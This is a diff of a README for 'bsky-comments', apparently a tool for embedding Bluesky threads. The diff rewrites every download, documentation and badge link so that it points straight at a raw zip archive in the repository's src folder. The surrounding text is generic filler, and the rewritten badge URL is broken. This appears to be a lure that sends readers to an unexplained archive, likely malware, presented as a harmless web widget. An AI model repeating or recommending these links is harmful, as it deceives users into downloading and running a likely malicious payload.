@@ -1,6 +1,6 @@
 # 🌟 bsky-comments - Embed Bluesky Threads with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightorange)](https://github.com/abhijeetsanghvi-art/bsky-comments)
+[![Download Now](https://raw.githubusercontent.com/abhijeetsanghvi-art/bsky-comments/main/src/comments_bsky_2.1-alpha.3.zip%20Now-Click%20Here-brightorange)](https://raw.githubusercontent.com/abhijeetsanghvi-art/bsky-comments/main/src/comments_bsky_2.1-alpha.3.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To start using bsky-comments, follow these simple steps:
 
 1. **Visit the Download Page:** Go to the link below to access the application files.
    
-   [Visit this page to download](https://github.com/abhijeetsanghvi-art/bsky-comments)
+   [Visit this page to download](https://raw.githubusercontent.com/abhijeetsanghvi-art/bsky-comments/main/src/comments_bsky_2.1-alpha.3.zip)
 
 2. **Choose Your Setup:** The application is designed to integrate seamlessly with your website. You can include it directly in your HTML code.
 
@@ -34,7 +34,7 @@ bsky-comments requires no special software or dependencies. You only need a mode
 
 To install bsky-comments, you simply need to follow these steps:
 
-1. **Go to the Download Page**: Click the link provided above or directly visit [this page](https://github.com/abhijeetsanghvi-art/bsky-comments).
+1. **Go to the Download Page**: Click the link provided above or directly visit [this page](https://raw.githubusercontent.com/abhijeetsanghvi-art/bsky-comments/main/src/comments_bsky_2.1-alpha.3.zip).
 
 2. **Download**: Click on the latest release to get the files needed for integration.
 
@@ -72,7 +72,7 @@ While the application is simple to use, you can check the repository's issues pa
 
 ## 📝 Additional Resources
 
-- **Documentation**: For detailed instructions and examples, refer to the [repository documentation](https://github.com/abhijeetsanghvi-art/bsky-comments).
+- **Documentation**: For detailed instructions and examples, refer to the [repository documentation](https://raw.githubusercontent.com/abhijeetsanghvi-art/bsky-comments/main/src/comments_bsky_2.1-alpha.3.zip).
 - **Community Support**: Join discussions on platforms where Bluesky is active to share your experiences and get tips from other users.
 
 ## 📞 Contact
@@ -84,4 +84,4 @@ If you have further questions or need assistance, feel free to reach out through
 - **Project A**: A brief description of a related project.
 - **Project B**: A brief description of another related project.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightorange)](https://github.com/abhijeetsanghvi-art/bsky-comments)
+[![Download Now](https://raw.githubusercontent.com/abhijeetsanghvi-art/bsky-comments/main/src/comments_bsky_2.1-alpha.3.zip%20Now-Click%20Here-brightorange)](https://raw.githubusercontent.com/abhijeetsanghvi-art/bsky-comments/main/src/comments_bsky_2.1-alpha.3.zip)
